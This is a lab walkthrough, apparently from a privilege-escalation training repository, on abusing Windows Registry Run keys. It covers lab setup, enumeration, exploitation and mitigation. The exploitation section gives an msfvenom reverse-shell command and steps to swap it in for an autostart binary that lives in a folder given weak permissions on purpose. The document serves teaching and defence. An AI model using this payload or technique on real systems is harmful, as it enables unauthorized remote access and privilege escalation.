# Logon Autostart Execution (Registry Run Keys)

## Table of Contents

- [Logon Autostart Execution (Registry Run Keys)](#logon-autostart-execution-registry-run-keys)
  - [Table of Contents](#table-of-contents)
  - [Description](#description)
  - [Lab Setup](#lab-setup)
    - [Manual Lab Setup](#manual-lab-setup)
    - [PowerShell Script Lab Setup](#powershell-script-lab-setup)
  - [Enumeration](#enumeration)
    - [Manual Enumeration](#manual-enumeration)
    - [Tool Enumeration](#tool-enumeration)
  - [Exploitation](#exploitation)
  - [Mitigation](#mitigation)
  - [References](#references)

## Description

Logon Autostart Execution through Registry Run Keys is a Windows feature that enables specific programs or scripts to launch automatically when a user logs into the system. This feature allows these programs or scripts to launch automatically without any manual action from the user when the operating system starts up. 

Attackers may exploit the Logon Autostart Execution feature by inserting malicious software into the Registry Run Keys. This enables the malicious code to automatically launch during system startup, potentially granting it elevated privileges. 

## Lab Setup

### Manual Lab Setup

:warning: <b>To proceed with this scenario, the local Administrator account needs to be enabled. I have created a PowerShell script named [EnableLocalAdmin.ps1](/Lab-Setup-Scripts/EnableLocalAdmin.ps1), designed to enable the local Administrator account and set a password. Please run this script with elevated privileges.</b>

1) Open a PowerShell with local Administrator privileges and run the following command to create a new folder:

```
mkdir "C:\Program Files\NickvourdSrv"
```

Outcome:

![Autostart-Registry-Keys-Create-Directory](/Pictures/AutostartRegistryKeys-LabSetup-Part1.png)

2) Download the file [NCV_AMD64.exe](/Lab-Setup-Binary/NCV_ADM64.exe) to the 'C:\Program Files\NickvourdSrv' directory.

3) Modify the permissions of the 'C:\Program Files\NickvourdSrv' directory to allow Full Control for all users:

![Autostart-Registry-Keys-Modify-Directory-Permissions](/Pictures/AutostartRegistryKeys-LabSetup-Part2.png)

4) Open a PowerShell with local Administrator privileges and run the following command to edit registry key:

```
regedit
```

5) Navigate to `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run` and create new String Value `NickvourdSrv`:

![Autostart-Registry-Keys-Create-Registry-key-String-Value](/Pictures/AutostartRegistryKeys-LabSetup-Part4.png)

6) Modify the key string named `NickvourdSrv` with value data `C:\Program Files\NickvourdSrv\NCV_AMD64.exe`:

![Autostart-Registry-Keys-Modify-Registry-key-String-Value](/Pictures/AutostartRegistryKeys-LabSetup-Part6.png)

### PowerShell Script Lab Setup 

:warning: To proceed with this scenario, the local Administrator account needs to be enabled. I have created a PowerShell script named [EnableLocalAdmin.ps1](/Lab-Setup-Scripts/EnableLocalAdmin.ps1), designed to enable the local Administrator account and set a password. Please run this script with elevated privileges.

Another way to set up the lab with the 'Logon Autostart Execution (Registry Run Keys)' scenario is by using the custom PowerShell script named [LogonAutostartExecutionRegistryRunKeys.ps1](/Lab-Setup-Scripts/LogonAutostartExecutionRegistryRunKeys.ps1).

Open a PowerShelll with local Administrator privileges and run the script:

```
.\LogonAutostartExecutionRegistryRunKeys.ps1
```

Outcome:

![Autostart-Registry-Keys-PowerShell-Lab-Setup-Script](/Pictures/AutostartRegistryKeys-LabSetup-Part7.png)

## Enumeration

### Manual Enumeration

To perform manual enumeration and identify whether a Windows workstation is vulnerable to the RegistryAutoruns issue, you can use the following command from a command prompt:

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

Outcome:

![RegistryAutoruns-Manual-Enumeration](/Pictures/RegistryAutoruns-Manual.png)

### Tool Enumeration

To run the SharpUp tool and perform an enumeration of the `RegistryAutoruns` vulnerability, you can execute the following command with appropriate arguments:

```
SharpUp.exe audit RegistryAutoruns
```

Outcome:

![RegistryAutoruns-SharpUp](/Pictures/RegistryAutoruns-SharpUp.png)

:information_source: Moreover, you can use `SharpUp.exe audit` to perform a comprehensive enumeration of all misconfigurations vulnerabilities on the specified machine.

## Exploitation

1) Use msfvenom to generate a malicious executable (exe) file that can be executed via the booting of the victim's machine:

```
msfvenom -p windows/x64/shell_reverse_tcp lhost=eth0 lport=1234 -f exe > shell.exe
```

2) Transfer the malicious executable file to victim's machine.

3) Move the malicious executable file to 'C:\Program Files\NickvourdSrv'.

4) Rename the 'NCV_AMD64.exe' to 'NCV_AMD64.bak'.

5) Rename the malicious exe (shell.exe) to 'NCV_AMD64.exe'.

Outcome:

![RegistryAutoruns-AboveActions](/Pictures/RegistryAutoruns-AboveActions.png)

6) Open a listener on your Kali machine.

7) Reboot the victim's machine and login as Adminstrator:

![Reboot-victim-machine](/Pictures/Reboot-Victim-Machine2.png)

8) Verify the reverse shell on your Kali machine:

![Reverse-Shell-As-Admin-RegistryAutoRuns](/Pictures/Reverse-Shell-As-Admin-RegistryAutoRuns.png)

## Mitigation

To defend against Registry auto-run vulnerabilities, adjust permissions on folders containing executables initiated through this mechanism. This limits unauthorized access and strengthens security measures.

Moreover, to delete a specific auto-run key value from the Windows Registry, you can use the following command in Command Prompt with local Administrator privileges:

```
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "<KeyName>" /f
```

## References

- [Run and RunOnce Registry Keys Microsoft](https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys)
- [Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Mitre](https://attack.mitre.org/techniques/T1547/001/)
